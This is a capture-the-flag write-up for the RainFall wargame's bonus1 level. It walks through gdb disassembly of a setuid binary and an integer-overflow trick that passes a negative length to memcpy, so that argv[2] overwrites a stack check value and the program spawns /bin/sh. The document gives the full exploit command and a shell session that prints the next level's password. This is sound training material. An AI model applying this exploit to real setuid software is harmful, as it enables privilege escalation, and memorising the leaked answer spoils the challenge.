# Bonus 1

- Once logged in, you will see a binary `bonus1`

```
[???]$ ssh localhost -p 4242 -l bonus1
	  _____       _       ______    _ _
	 |  __ \     (_)     |  ____|  | | |
	 | |__) |__ _ _ _ __ | |__ __ _| | |
	 |  _  /  _` | | '_ \|  __/ _` | | |
	 | | \ \ (_| | | | | | | | (_| | | |
	 |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                 Good luck & Have fun

  To start, ssh with level0/level0 on localhost:4242
bonus1@localhost's password:
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus1/bonus1
bonus1@RainFall:~$ ls
bonus1
bonus1@RainFall:~$

```

by executing the program, it segfault with no argument, and does nothing with the argument.
```
bonus1@RainFall:~$ ./bonus1
Segmentation fault (core dumped)
bonus1@RainFall:~$ ./bonus1 aaaaaaaaaaaaaaaa
bonus1@RainFall:~$
```

By taking a look at the binary, the function is calling execl, and on the above, in order to fall into the condition, the value esp+0x3c needs to be equal to `0x574f4c46`

```
gdb-peda$ disass main
[...]
   0x08048478 <+84>:	cmp    DWORD PTR [esp+0x3c],0x574f4c46
   0x08048480 <+92>:	jne    0x804849e <main+122>
   0x08048482 <+94>:	mov    DWORD PTR [esp+0x8],0x0
   0x0804848a <+102>:	mov    DWORD PTR [esp+0x4],0x8048580
   0x08048492 <+110>:	mov    DWORD PTR [esp],0x8048583
   0x08048499 <+117>:	call   0x8048350 <execl@plt>
   0x0804849e <+122>:	mov    eax,0x0
   0x080484a3 <+127>:	leave
   0x080484a4 <+128>:	ret
End of assembler dump.
gdb-peda$ x/s 0x8048580
0x8048580:	 "sh"
gdb-peda$ x/s 0x8048583
0x8048583:	 "/bin/sh"
gdb-peda$ x/s 0x0
0x0:	 <Address 0x0 out of bounds>
```

In order to prevent program to jump to <main+127>, the input has to be less and equal to 9 (`because of the operator JLE--Jump less or equal `), so that we can access to `memcpy()`, which might be usable for vulnerbility. Also, by looking at <+68> to <+72>, it is easily noticable that it takes two arguments.
```
   [...]
   0x08048438 <+20>:	call   0x8048360 <atoi@plt>
   0x0804843d <+25>:	mov    DWORD PTR [esp+0x3c],eax
   0x08048441 <+29>:	cmp    DWORD PTR [esp+0x3c],0x9
   0x08048446 <+34>:	jle    0x804844f <main+43>
   0x08048448 <+36>:	mov    eax,0x1						;
   0x0804844d <+41>:	jmp    0x80484a3 <main+127>
   0x0804844f <+43>:	mov    eax,DWORD PTR [esp+0x3c]
   0x08048453 <+47>:	lea    ecx,[eax*4+0x0]				; setting ecx (eax(x) *4 + 0x0(0) = 4 * x)
   0x0804845a <+54>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804845d <+57>:	add    eax,0x8
   0x08048460 <+60>:	mov    eax,DWORD PTR [eax]
   0x08048462 <+62>:	mov    edx,eax
   0x08048464 <+64>:	lea    eax,[esp+0x14]
   0x08048468 <+68>:	mov    DWORD PTR [esp+0x8],ecx		; ecx is 4 * x
   0x0804846c <+72>:	mov    DWORD PTR [esp+0x4],edx		; address of src
   0x08048470 <+76>:	mov    DWORD PTR [esp],eax			; address of dst
   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
   [...]
``

So the condition of two arguments needs to be set as following:
	- the first argument needs to be less than equal to 9
	- the second argument will needs to be equal to `0x574f4c46`, because of the comparison

How are we going to achieve each? because the number will be stored as DWORD(32 bits = int in 32 bits), the minimum number of interger is MIN_INT = `-2147483647`, and once multiplying by 4, the number will become 4. We want the value passed into last parameter for `memcpy` to be stored as at least bigger than 40 (beginning with -2147473637 to ...). (padding + value) For second argument, the second argument is copied into a buffer located 40 bytes above the location of the call `atoi()`.

and the number can be

So the payload will be the following:

```
  argv[1]        argv[2]
-2147483630  |  "A"* 40 + "\x46\x4c\x4f\x57"

-2147483630 $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')
```

```
bonus1@RainFall:~$ ./bonus1 -2147483630 $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')
$
$ whoami
bonus2
$ cat /home/user/$(whoami)/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
$
```
